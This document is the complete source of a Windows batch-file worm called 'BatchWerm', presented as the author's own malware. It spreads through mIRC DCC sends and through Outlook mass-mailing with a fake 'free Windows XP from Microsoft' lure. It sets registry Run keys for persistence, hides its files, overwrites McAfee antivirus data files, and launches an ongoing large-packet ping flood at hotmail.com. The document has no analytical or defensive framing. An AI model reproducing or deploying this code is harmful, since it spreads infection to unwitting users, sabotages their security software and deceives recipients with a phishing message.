
BAT/BatchWerm by AlcoPaul 

@echo off 
del c:\mIRC\script.ini
echo [script] > c:\mIRC\script.ini
echo n0= on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\WINDOWS\UpgradeToWindowsXP.bat } >> c:\mIRC\script.ini
cd\
md XP
copy %0.bat c:\XP
cls
attrib +h +r c:\XP
echo n1= /join #Beginner >> c:\mIRC\script.ini
if exist c:\WINDOWS\UpgradeToWindowsXP.bat goto rancid
copy %0.bat c:\WINDOWS\UpgradeToWindowsXP.bat
:rancid
if exist c:\XPUpdate.reg goto punk
echo REGEDIT4 > c:\XPUpdate.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> c:\XPUpdate.reg
echo "PX"="c:\\XP\\xp.bat" >> c:\XPUpdate.reg
:punk
start c:\XPUpdate.reg
for %%f in (C:\progra~1\mcafee\mcafee~1\*.dat) do copy %0.bat %%f
if exist c:\X.vbs goto goldfinger
echo. on error resume next > c:\X.vbs
echo dim a,b,c,d,e >> c:\X.vbs
echo set a = Wscript.CreateObject("Wscript.Shell") >> c:\X.vbs
echo a.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\XXP", "c:\XP\xp.bat" >> c:\X.vbs
echo set b = CreateObject("Outlook.Application") >> c:\X.vbs
echo set c = b.GetNameSpace("MAPI") >> c:\X.vbs
echo for y = 1 To c.AddressLists.Count >> c:\X.vbs
echo set d = c.AddressLists(y) >> c:\X.vbs
echo x = 1 >> c:\X.vbs
echo set e = b.CreateItem(0) >> c:\X.vbs
echo for o = 1 To d.AddressEntries.Count >> c:\X.vbs
echo f = d.AddressEntries(x) >> c:\X.vbs
echo e.Recipients.Add f >> c:\X.vbs
echo x = x + 1 >> c:\X.vbs
echo next >> c:\X.vbs
echo e.Subject = "Upgrade to Windows XP" >> c:\X.vbs
echo e.Body = "Good news from Microsoft. Click the attachment for your FREE Windows XP. Upgrade to Windows XP now." >> c:\X.vbs
echo e.Attachments.Add ("c:\WINDOWS\UpgradeToWindowsXP.bat") >> c:\X.vbs
echo e.DeleteAfterSubmit = False >> c:\X.vbs
echo e.Send >> c:\X.vbs
echo f = "" >> c:\X.vbs
echo next >> c:\X.vbs
echo a.run("c:\PROGRA~1\INTERN~1\iexplore.exe http://www.yahooka.com") >> c:\X.vbs
echo a.run("c:\WINDOWS\ping.exe -l 10000 -t www.hotmail.com") >> c:\X.vbs
:goldfinger
start c:\X.vbs
attrib +h +r c:\X.vbs
exit
::BatchWerm by Alcopaul....:P